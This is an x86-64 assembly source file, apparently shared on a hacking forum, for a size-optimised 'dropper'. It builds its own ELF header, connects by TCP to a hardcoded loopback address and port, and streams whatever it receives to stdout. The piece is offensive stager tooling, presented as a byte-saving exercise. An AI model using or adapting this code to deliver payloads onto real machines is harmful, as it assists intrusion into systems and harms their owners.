;;; 
;;;  *  fwget1. FemtoWget. Minimal dropper in asm (Version 3)
;;;  *  Copyright (c) 2020 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.


BITS 64
	        org 0x400000
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr


	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; 	mov rdi, 1
	;; 	lea rsi, [rel msg1]
	;; 	mov rdx, 7

	;; 	call _write

	;; Variables
	;; [rbp + 0x00] -> s (socket)
	;; [rbp + 0x08] -> len (int)
	;; [rbp + 0x10] -> buf (unsigned char)
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	call _socket
	
	mov r8, rax		; FD should be 4 or 5
	;;  It is unlikely that the socket syscall will fail
	;; 	cmp rax, 0
	;; 	jle error
	

	;; connect (s [rbp+0], addr, 16)
	;; 	mov rdi, rax
	mov edi, eax		; Saves 1 byte
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	mov rsi, 0x0100007f11110002
	lea rsi, [rel addr]
	;; 	mov rdx, 16
	;;	add rdx, 10		; Saves 1 byte :)
	add edx,10
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	;; 	test eax, eax
	;; 	jl error

	lea rsi, [rbp+0x10]
l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, r8
	mov rdx, 1024
	call _read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp eax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	;;	File descriptors get closed automatically when the process dies
	;; 	mov rdi, r8
	;; 	call _close
;;; 	mov rdi, 0		;Success
	;; We have somehow already initialised the high part of registers
	;; So it is set to zero and we can just work with the 32bits version
	;; that requieres smaller code
	xor edi,edi
	call _exit

	
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall
	
_exit:
	xor eax,eax
	add al, 60
	;;  	mov rax, 60
	;; 	jmp _do_syscall

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db "ERROR", 10,0
filesize equ $ - $$
